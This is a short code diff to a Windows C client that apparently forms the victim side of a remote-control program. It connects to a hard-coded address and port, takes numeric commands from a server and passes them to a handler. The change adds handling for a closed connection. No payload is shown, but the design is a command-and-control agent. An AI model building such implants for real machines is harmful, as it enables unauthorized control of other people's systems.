@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <stdbool.h>
 #include "victimCommands.h"
+#include <io.h>
 
 #define PORT 44444
 #define IP "10.0.0.2"
@@ -67,7 +68,14 @@ void getCommands()
     while (true)
     {
         // Gets the command
-        recv(serverSocket, (char *)&command, sizeof(command), 0);
+        if (recv(serverSocket, (char *)&command, sizeof(command), 0) <= 0)
+        {
+            // TODO: checks that
+            printf("Server connection has been closed!\n");
+            printf("Exists program...");
+            close(serverSocket);
+            exit(0);
+        }
         command = ntohl(command);
         processCommand(command);
     }
